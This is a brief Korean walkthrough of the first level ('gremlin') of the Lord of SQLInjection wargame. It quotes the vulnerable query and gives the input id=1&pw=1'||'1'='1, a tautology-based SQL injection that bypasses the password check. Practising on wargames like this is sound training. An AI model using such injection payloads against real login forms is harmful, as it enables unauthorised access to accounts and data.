Lord of SQLInjection 
gremlin 문제 [1단계]
id 와 pw 의 값으로 둘 다 참을 넣어주면 
if($result['id']) solve("gremlin"); 이 실행 되어
문제가 풀리게 된다
쿼리문 : "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
id=1&pw=1'||'1'='1 로 입력하면
쿼리문에 where id='1' and pw='1'or'1'='1'
이 되어 문제가 풀린다.